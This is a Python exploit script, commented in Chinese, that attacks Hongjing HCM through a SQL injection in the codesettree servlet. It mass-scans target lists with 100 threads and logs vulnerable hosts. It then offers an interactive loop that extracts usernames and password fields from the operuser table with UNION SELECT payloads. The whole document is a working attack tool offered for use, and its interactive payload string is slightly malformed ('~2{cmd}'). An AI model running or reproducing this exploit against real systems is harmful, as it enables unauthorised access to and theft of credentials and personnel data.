# 宏景HCM SQL注入漏洞
#漏洞利用只能使用 -u进行
import requests
import argparse
import sys
import re
import time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    pass

def main():
    # banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="宏景HCM SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
        	exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2cusername~20from~20operuser~20~2d~2d'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Connection": "close",
    }
    proxies = {
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        response = requests.get(url=target+payload, headers=headers, proxies=proxies, verify=False)
        # print(response.status_code)
        if response.status_code == 200 and "xml" in response.text:
            print(f"[+]该网址存在sql注入漏洞{target}")
            with open('result.txt', 'a') as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-]该网址不存在sql注入漏洞{target}")
    except requests.RequestException as e:
        print(f"[*]该网址存在问题，请手动检测{target}")

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)
    proxies = {
    	'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    while True:
        cmd = input('请输入你要查询的信息，q退出 例如：(cpassword,cusername)>')
        if cmd == 'q':
            print("正在退出，请等候....")
            break
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Connection": "close",
        }
        payload = f'/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27~31~27~2{cmd}~20from~20operuser~20~2d~2d'
        res = requests.get(url=target+payload, headers=headers,proxies=proxies,verify=False)
        text_values = re.findall(r'text="(.*?)"',res.text,re.S)
        for value in text_values:
        	print(value)

if __name__ =='__main__':
    main()